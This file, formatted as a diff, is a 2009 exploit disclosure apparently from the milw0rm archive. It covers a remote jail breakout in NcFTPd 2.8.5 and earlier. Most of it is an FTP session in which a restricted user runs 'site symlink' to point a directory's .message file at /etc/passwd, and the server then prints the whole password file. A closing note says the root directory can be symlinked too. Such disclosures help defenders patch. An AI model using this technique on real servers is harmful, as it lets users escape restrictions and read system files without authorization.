@@ -1,0 +1,85 @@
+NcFTPd <= 2.8.5 remote jail breakout
+
+Discovered by:
+	Kingcope
+	Contact: kcope2<at>googlemail.com / http://isowarez.de
+
+Date:
+	27th July 2009
+
+Greetings:
+	Alex,Andi,Adize,wY!,Netspy,Revoguard
+
+Prerequisites:
+	Valid user account.
+	
+Demonstration on FreeBSD 7.0-RELEASE and NcFTPd 2.8.5 (latest version):
+
+# ftp 192.168.2.5
+Connected to 192.168.2.5.
+220 localhost NcFTPd Server (unregistered copy) ready.
+Name (192.168.2.5:root): kcope
+331 User kcope okay, need password.
+Password:
+230-You are user #1 of 50 simultaneous users allowed.
+230-
+230 Restricted user logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> get /etc/passwd passwd
+local: passwd remote: /etc/passwd
+502 Unimplemented command.
+227 Entering Passive Mode (192,168,2,5,219,171)
+550 No such file.
+ftp> ls ..
+227 Entering Passive Mode (192,168,2,5,218,102)
+553 Permission denied.
+ftp> mkdir isowarez
+257 "/isowarez" directory created.
+ftp> quote site symlink /etc/passwd isowarez/.message
+250 Symlinked.
+ftp> cd isowarez
+250-"/isowarez" is new cwd.
+250-
+250-# $FreeBSD: src/etc/master.passwd,v 1.40 2005/06/06 20:19:56 brooks Exp $
+250-#
+250-root:*:0:0:Charlie &:/root:/bin/sh
+250-toor:*:0:0:Bourne-again Superuser:/root:
+250-daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
+250-operator:*:2:5:System &:/:/usr/sbin/nologin
+250-bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
+250-tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
+250-kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
+250-games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
+250-news:*:8:8:News Subsystem:/:/usr/sbin/nologin
+250-man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+250-sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+250-smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
+250-mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
+250-bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
+250-proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+250-_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
+250-_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
+250-uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+250-pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
+250-www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+250-nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
+250-kcope:*:1001:1001:User kcope:/home/kcope:/bin/csh
+250-messagebus:*:556:556:D-BUS Daemon User:/nonexistent:/sbin/nologin
+250-polkit:*:562:562:PolicyKit Daemon User:/nonexistent:/sbin/nologin
+250-haldaemon:*:560:560:HAL Daemon User:/nonexistent:/sbin/nologin
+250-ftp:*:1002:14:User &:/home/ftp:/bin/sh
+250-cyrus:*:60:60:the cyrus mail server:/usr/local/cyrus:/bin/csh
+250-postfix:*:125:125:Postfix Mail System:/var/spool/postfix:/usr/sbin/nologin
+250-test:*:1003:1003:test:/home/test:/bin/sh
+250-+testx:*:::::/bin/sh
+250
+ftp>
+
++on freebsd you can symlink directories like ´/´
+
+Cheerio,
+
+Kingcope
+
+# milw0rm.com [2009-07-27]
